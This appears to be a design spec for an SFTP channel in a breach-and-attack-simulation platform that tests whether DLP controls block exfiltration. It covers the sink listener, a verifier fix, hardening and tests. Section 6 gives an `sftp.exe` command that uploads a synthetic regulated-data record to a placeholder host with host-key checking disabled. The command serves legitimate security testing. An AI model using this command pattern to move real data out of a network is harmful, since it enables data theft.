# SFTP Exfiltration Channel — Design

## Problem

Third sub-project of the DLP exfiltration maturity program, following the
sink-verified HTTPS channel
(`docs/superpowers/specs/2026-08-19-dlp-exfiltration-sink-service-design.md`)
and DNS tunneling
(`docs/superpowers/specs/2026-08-19-dns-tunneling-exfiltration-channel-design.md`).
Per the user's own prioritized roadmap
([[project_dlp_exfiltration_channel_roadmap]]), SFTP is next: a genuinely
different exfiltration technique — a file-transfer protocol over its own
TCP session — that tests whether network-layer controls catch
protocol-based exfiltration regardless of content-inspection capability on
HTTP(S), distinct from both prior channels.

Unlike HTTPS (`Invoke-RestMethod`) and DNS (`nslookup`), there is no
zero-setup SFTP client built into stock Windows PowerShell. This is the
first channel where the client tool itself may not be present on a given
endpoint, which surfaces two real design questions neither prior channel
had to answer: how the agent performs the transfer at all, and how the
verifier avoids mistaking "the tool wasn't there" for "DLP blocked it."

## Decisions

Confirmed during brainstorming:

- **SFTP client: native Windows OpenSSH `sftp.exe`, detected at execution
  time via `Get-Command`, never installed or bundled.** No
  `Install-Module Posh-SSH` (requires PowerShell Gallery/internet
  reachability — a real problem for this platform's on-prem/air-gapped-first
  customers, and confounds the test with the install step's own success).
  No bundled third-party SFTP binary (a new kind of agent footprint this
  program hasn't needed before, and less realistic than using what's
  natively present — an attacker would do the same). If `sftp.exe` is
  absent, the step's first output line is `skip: sftp.exe (OpenSSH Client)
  not found on this endpoint`, the existing marker convention
  `classifyExecution` already recognizes (`internal/scenario/outcome.go:237`).
  Capability detection happens live on the endpoint at execution time —
  never assumed from OS version alone.
- **Verdict stays strictly sink-primary; no third `ERROR`/`FAILURE` state.**
  Local execution result — `sftp.exe`'s exit code, stdout, stderr, or a
  timeout — is *evidence*, never the graded truth. It is captured as
  `DLP_OBSERVATION:` secondary evidence exactly like the existing
  local-marker mechanism, but `dlpVerifier` never uses it to decide the
  verdict. The only two outcomes for a step that actually ran are
  `Succeeded` (token reached the sink) and `Blocked` (it didn't) —
  identical semantics to HTTPS and DNS. This applies even when the local
  command *looks* successful: a connection refused, an RST, a timeout, an
  auth failure, or a silent content-inspection drop are all just different
  ways the same thing happened — the data never reached the sink — and all
  resolve to `Blocked`. `sftp.exe` exiting 0 is not, by itself, proof of
  anything; only the receipt is.
- **`dlpVerifier` gains a `skip:`-marker check, checked before
  `SinkTokenObserved`.** This is a real gap in the already-shipped,
  already-tested verifier (`internal/reporting/dlp.go`), only exposed by
  this channel: `internal/verifysync.annotateSinkReceipts`
  (`job.go:134`) sets `SinkTokenObserved` for *every* step with a token
  issued for the run, regardless of the step's own execution outcome —
  and token issuance happens at dispatch time, before the script even
  checks tool availability. Without this fix, a genuinely absent
  `sftp.exe` (no transfer ever attempted) would resolve to
  `SinkTokenObserved = false` → `ObservationBlocked` → likely graded as
  `Match` against `expected_outcome: Block` — silently reading "the test
  tool was missing" as "DLP successfully blocked the exfiltration." HTTPS
  and DNS never hit this because their client tools are never absent.
  Fix: `Verify()` checks whether `RawOutput`'s first line matches the
  `skip:` convention first; if so, resolves to `ObservationUnknown` /
  `StatusUnknown` (the existing "could not evaluate" terminal state, no
  new constant needed) regardless of what `SinkTokenObserved` says. A new
  regression test proves the existing HTTPS/DNS steps — which never emit
  `skip:` — are completely unaffected.
- **Sink listener binds container-internal port 22; the host-published
  port is a separate, configurable, non-standard value (default 2222).**
  Every deployment target is a Linux host reached via SSH for
  administration — host port 22 is essentially guaranteed to already be
  owned by the real `sshd`. `docker-compose.yml` publishes
  `"${SINK_SFTP_PORT:-2222}:22/tcp"`: the listener inside the container
  still speaks genuine SSH/SFTP wire protocol on its own standard port 22
  (what protocol-aware DLP/IDS tools actually fingerprint — SSH detection
  is rarely pure port-22-only the way some DNS security tools specifically
  watch port 53), but the host-side published port never contends with the
  box's real `sshd`. **The SFTP sink MUST NOT publish container port 22
  directly to host port 22.** No automatic fallback to a different port if
  the configured one is already taken — Docker's own bind failure at
  `docker compose up` is the enforcement; silently picking another port
  would make the scenario's `{{SINK_SFTP_PORT}}` placeholder lie about
  what's actually listening.
- **Server library: `github.com/pkg/sftp` + `golang.org/x/crypto/ssh`.**
  `x/crypto` is already a dependency (`go.mod`); `pkg/sftp` is the
  standard, mature Go SFTP server implementation built on it — same
  "don't hand-roll wire protocol" lesson DNS already established with
  `miekg/dns`. This listener accepts binary, endpoint-influenced input on
  an open port; a hand-rolled SSH/SFTP implementation is far riskier to
  get subtly wrong than DNS wire parsing ever was.
- **Auth: `ssh.ServerConfig{NoClientAuth: true}`.** Consistent with the
  existing philosophy already established for both prior channels — the
  point is testing content/protocol inspection, not access control, and a
  garbage connection attempt proves nothing either way. This also avoids a
  real complication: OpenSSH's non-interactive `BatchMode` (required for
  unattended scripted execution) effectively demands key-based auth, which
  would mean generating and distributing a keypair per token. With
  `NoClientAuth`, the SSH server grants access on the client's initial
  `none` auth probe — no key, no password, no credential management at
  all. `sftp.exe` still needs *some* literal username in its connection
  string (SSH protocol requires one) — a fixed, non-secret literal (e.g.
  `dlptest`) baked directly into the scenario's PowerShell text, not a
  placeholder.
- **Token-to-upload correlation: filename.** The step uploads a file named
  `{{SINK_TOKEN}}.dat`. Reuses the existing 32-byte token exactly as the
  HTTPS channel does — SFTP has no DNS-style 63-character label
  constraint, so no new token byte-length variant is needed. On `Close()`
  of any uploaded file, the handler extracts the token from the filename,
  hashes the buffered content (SHA-256), and writes one `dlp_sink_receipts`
  row (`channel='sftp'`) — same insert shape both existing channels
  already use. Raw payload is never persisted, matching both prior
  channels exactly.

## Design

### 1. Deployment

New package `internal/sftpsink`, mirroring `internal/dnssink`'s isolation
from the existing HTTP sink (`internal/api/dlp_sink.go`) — its own
listener lifecycle, independently enable/disable-able
(`SFTP_SINK_ENABLED`, default `true`). `cmd/server/main.go` starts its
listener goroutine alongside the HTTP server and DNS listener:

```go
if cfg.SFTPSinkEnabled {
    sftpsink.StartListener(context.Background(), ":22", pool)
} else {
    log.Println("[sftpsink] disabled via SFTP_SINK_ENABLED=false")
}
```

On failure to bind container-internal port 22 (should not happen in
practice — nothing else in a fresh orchestrator container claims it — but
handled the same way DNS handles its own bind failure for consistency):
logs clearly, records a `FAILED` status with the reason via an exported
`sftpsink.Status() (state string, reason string)`, and returns — the rest
of the orchestrator starts and runs normally regardless. No dashboard
surface required for V1, matching both prior channels' precedent.

`docker-compose.yml` adds:

```yaml
cap_add:
  - NET_BIND_SERVICE
ports:
  - "${SINK_SFTP_PORT:-2222}:22/tcp"
```

(`NET_BIND_SERVICE` is likely already present from the DNS channel's
port-53 requirement — reused, not duplicated, if so.) `SINK_SFTP_PORT` is
a deployment-time config value (`setup.conf`/`.env`), default `2222`,
giving customers the ability to choose a different unused host port
without touching the container's SFTP protocol port. **`install.sh` must
never allow this to be set to `22`** — validated at config-load time the
same place `DATA_DIR`/other required fields are validated, failing loudly
rather than allowing a value that would collide with the host's own
`sshd`.

### 2. Placeholder substitution

`issueSinkTokensAndSubstitute` (`internal/api/dlp_sink.go`) gains a third
placeholder branch. A step whose command contains `{{SINK_SFTP_HOST}}` or
`{{SINK_SFTP_PORT}}` (checked independently of the DNS branch's
`strings.Contains` pattern, same shape) triggers the existing 32-byte
`{{SINK_TOKEN}}` path (unchanged — SFTP shares the HTTP channel's token
flavor, not the DNS channel's) plus:

- `{{SINK_SFTP_HOST}}` — the orchestrator's own reachable host/IP,
  derived from the same `publicBaseURL` source `{{SINK_DNS_SERVER}}`
  already uses via the existing `dnsServerHost()` helper — no new
  derivation logic, reused as-is. Optionally overridable via a
  `SINK_SFTP_HOST` config value for deployments where the externally
  reachable address differs from `publicBaseURL`'s host (e.g. NAT); falls
  back to the derived value when unset.
- `{{SINK_SFTP_PORT}}` — the configured `SINK_SFTP_PORT` value (default
  `2222`), i.e. the *host-published* port an external client actually
  connects to — not the container-internal 22 the listener itself binds.

A step may combine `{{SINK_TOKEN}}` with either the HTTP pair
(`{{SINK_URL}}`) or the SFTP pair (`{{SINK_SFTP_HOST}}`/
`{{SINK_SFTP_PORT}}`) or the DNS pair, never more than one channel's
placeholders in the same step — same pattern DNS's spec already
established for its own placeholder set.

### 3. SSH/SFTP server

`sftpsink.StartListener` opens a TCP listener on `:22` inside the
container and, per accepted connection, performs the SSH handshake via
`ssh.ServerConfig{NoClientAuth: true}` then hands the resulting channel to
`pkg/sftp`'s server with a custom `sftp.Handlers` implementation:

- **Open (write)**: validates the requested filename matches
  `<token>.dat` shape: rejects anything else outright (no directory
  listing, no read, no rename — this listener supports exactly one
  operation). Extracts `<token>`.
- **Write**: accumulates bytes into a bounded in-memory buffer for this
  session (see Security hardening below for the ceiling).
- **Close**: computes SHA-256 of the buffered content, writes one
  `dlp_sink_receipts` row (`token=<token>`, `channel='sftp'`,
  `payload_hash=<hash>`, `payload_size=<len>`, `source_ip=<TCP peer>`) —
  the same insert shape `DLPSink` (`internal/api/dlp_sink.go`) already
  uses, just triggered from this listener instead of the HTTP handler.
  Discards the buffer immediately after — raw payload never persisted.
- **Everything else** (`Fstat`, `List`, `Readlink`, etc.): returns a
  generic permission-denied response. This listener has no legitimate use
  for any SFTP operation beyond a single write-then-close.

Because `dlp_sink_receipts` and its consumers
(`internal/verifysync.annotateSinkReceipts`,
`internal/reporting.dlpVerifier`) already only check "does at least one
receipt exist for this token," **no changes are needed to either of
those beyond the `skip:`-marker fix above** — the sink-primary verdict
logic applies to this channel automatically once the listener writes into
the same table, exactly as DNS's spec established for its own channel.

### 4. Security hardening

Same bar DNS's Section 7 set, adapted for a TCP/file-upload listener
instead of UDP/DNS-wire:

- Bounded per-upload byte ceiling — reject/abort a write once it exceeds
  a fixed maximum (the synthetic `[BAS-SIM-DLP]` record is small; a
  generous but firm ceiling, e.g. 64KB, catches anything abusive).
- Bounded total in-memory session state across all concurrent
  connections — the oldest/idle sessions are evicted first if a ceiling
  is reached.
- Idle-session timeout — a connection that opens but never completes a
  write within a bounded window is closed.
- A coarse per-source-IP concurrent-session and rate limit, matching the
  DNS listener's per-source-IP rate limit.
- Reject any filename not matching the expected `<token>.dat` shape
  before any buffer is allocated.
- Logging never includes file content — only the token, size, and hash,
  consistent with both existing channels' "never log the sensitive
  payload" principle.

### 5. `dlpVerifier` fix

`internal/reporting/dlp.go`'s `Verify()` gains one check, before the
existing `SinkTokenObserved != nil` branch:

```go
first, _, _ := strings.Cut(strings.TrimLeft(ev.RawOutput, "\r\n"), "\n")
first = strings.TrimSpace(first)
if len(first) >= 5 && strings.EqualFold(first[:5], "skip:") {
    r.ObservedOutcome = ObservationUnknown
    r.Comparison = comparatorFor("dlp").Compare(r.ExpectedOutcome, r.ObservedOutcome)
    r.Status = collapseToStatus(r.Comparison)
    return r
}
```

`internal/scenario`'s own `firstLine`/`classifyExecution`
(`outcome.go:224,237`) establish the identical `skip:` convention and
detection shape, but `firstLine` is unexported and `internal/reporting`
does not import `internal/scenario` for this — `dlp.go`'s own doc comment
is explicit that this package "stays a pure function throughout." The
check above is a small local equivalent, not a cross-package call. If the
duplication reads badly once both exist side by side, extracting a
shared helper is a reasonable implementation-time call — not a
requirement of this spec.

### 6. V1 scenario content

New scenario `scenarios/dlp-exfiltration-sftp.yaml`, one step. MITRE
technique ID confirmed at plan-writing time against ATT&CK's current
naming (likely T1048 sub-technique — SFTP falls under Exfiltration Over
Alternative Protocol), same precedent DNS's spec used. PowerShell:

1. Resolves `sftp.exe` via `Get-Command -ErrorAction SilentlyContinue`;
   if absent, prints `skip: sftp.exe (OpenSSH Client) not found on this
   endpoint` and exits.
2. Writes the same synthetic `[BAS-SIM-DLP]` multi-type record
   (PAN/Aadhaar/SWIFT/UPI/credit-card) both existing channels already use
   to a temp file.
3. Builds a non-interactive SFTP batch file (`put <tempfile>
   {{SINK_TOKEN}}.dat`) and invokes `sftp.exe -oBatchMode=yes
   -oStrictHostKeyChecking=no -oUserKnownHostsFile=NUL -P
   {{SINK_SFTP_PORT}} -b <batchfile> dlptest@{{SINK_SFTP_HOST}}`.
4. Captures exit code and stderr as `DLP_OBSERVATION:` secondary evidence
   (diagnostic only — never the graded truth, per the Decisions section
   above).
5. Cleans up the temp file and batch file.

Tagged `[BAS-SIM-DLP-SFTP]`. New detection-profile entry
(`dlp-sftp-block`) added to
`scenarios/detection-profiles/windows_dlp_exfiltration.yaml`, following
the same `outcome_family: dlp`, `expected_outcome: Block` shape as the
existing HTTPS/DNS entries. Expected outcome: `Block` — a real DLP/proxy
should recognize the regulated-data pattern (or the protocol itself, on a
network-layer control) and prevent the transfer from completing.

## Testing

- Go unit tests in `internal/sftpsink`: SSH handshake with
  `NoClientAuth`, filename-shape validation (accepts `<token>.dat`,
  rejects anything else), correct `dlp_sink_receipts` row written on a
  successful write-then-close with the right hash/size, correct rejection
  of each security-hardening case (oversized write, idle timeout,
  rate-limit trip), correct generic-denial response for any non-write
  SFTP operation.
- `internal/api/dlp_sink_test.go`: the new `{{SINK_SFTP_HOST}}`/
  `{{SINK_SFTP_PORT}}` placeholder substitution, confirming the existing
  32-byte token path is reused unchanged (no new token flavor).
- `internal/reporting/dlp_test.go`: new test proving a `skip:`-marker
  `RawOutput` resolves to `StatusUnknown` regardless of what
  `SinkTokenObserved` is set to (the actual bug this spec fixes) — plus
  the existing regression test pattern (`TestDLPVerifier_NoSinkToken_UnaffectedByNewLogic`-style)
  confirming HTTPS/DNS steps, which never emit `skip:`, are unaffected by
  this new check.
- An integration-style test: dispatch a step, connect a real SFTP client
  to a listener instance bound to an ephemeral port (not 22, to keep
  tests runnable without elevated privileges), upload `<token>.dat`,
  confirm a `dlp_sink_receipts` row lands with the correct hash/size, and
  confirm `dlpVerifier` resolves `Succeeded` from it exactly as it would
  for HTTPS/DNS.
- Regression confirmation: full `internal/reporting` and
  `internal/verifysync` suites re-run to prove the shared `dlpVerifier`
  change doesn't alter either prior channel's behavior.

## Out of scope

- SMTP/E-mail and ICMP tunneling listeners — next in priority order per
  the user's roadmap, each its own sub-project.
- Cloud storage APIs and webhook-style channels — deferred per the
  existing roadmap's rationale (real vendor upload-API shape decision;
  duplicates HTTPS's test value in V1's on-prem-only model).
- SFTP directory listing, download, rename, or any operation beyond a
  single write-then-close — this listener has no legitimate use for them.
- Key-based SSH auth or any credential-management flow — deliberately
  avoided via `NoClientAuth`, per the Decisions section.
- A dashboard/UI surface for the SFTP listener's health status — the
  status is queryable server-side (`sftpsink.Status()`) for a future view
  to consume, matching both prior channels' precedent.
